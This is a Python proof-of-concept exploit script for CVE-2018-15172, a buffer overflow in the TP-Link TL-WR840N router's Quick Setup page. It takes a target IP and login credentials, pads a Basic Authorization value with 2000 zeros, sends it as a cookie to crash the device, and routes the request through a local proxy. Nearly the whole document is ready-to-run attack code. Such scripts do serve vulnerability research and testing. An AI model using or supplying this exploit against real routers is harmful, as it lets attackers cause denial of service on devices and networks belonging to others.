# Device: Tp-link TL-WR840N Firmware: 0.9.1.3.16

import requests
import sys
import base64
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                              CVE-2018-15172                                |
|                                                                            |
|  TP-Link WR840N is vulnerable to a denial of service, caused by a buffer   |
|  overflow in 'Quick setup' functionality. By using an overly long          | 
|  Authorization HTTP header, a remote attacker could exploit this           |
|  vulnerability to cause a denial of service.                               |
 -----------------------------------------------------------------------------
"""

if len(sys.argv) is not 4:
   print(description)
   print(Fore.YELLOW+"[-] Example: python cve-2018-15172.py <Target IP> <ID> <Password>"+Fore.RESET)
   sys.exit()

target=sys.argv[1]
ID=sys.argv[2]
Password=sys.argv[3]
s=ID + ':' + str(Password)

encookie = base64.encodestring(s)

zero='0'*2000
proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'} 
URL='http://'+target+'/main/qsStart.htm'
cookie='Authorization=Basic ' + encookie.rstrip('\n') + zero
headers = {'Referer' : 'http://192.168.0.1/mainFrame.htm'}
cookies = {'cookie' : cookie} 
res=requests.get(URL, headers=headers, cookies=cookies, proxies=proxies)
